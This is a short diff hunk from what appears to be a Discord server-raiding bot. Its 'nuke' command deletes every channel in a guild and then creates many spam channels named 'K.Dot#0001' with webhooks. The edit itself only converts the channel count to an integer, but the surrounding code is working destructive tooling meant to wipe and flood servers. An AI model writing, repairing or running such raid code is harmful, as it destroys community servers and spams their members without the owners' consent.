@@ -75,7 +75,7 @@ async def nuke(ctx):
                 await channel.delete()
             except:
                 print("a")
-        for i in range(AMMOUNT_OF_CHANNELS):
+        for i in range(int(AMMOUNT_OF_CHANNELS)):
             try:
                 kdot = await ctx.guild.create_text_channel(name='K.Dot#0001')
                 webhook = await kdot.create_webhook(name='K.Dot#0001')
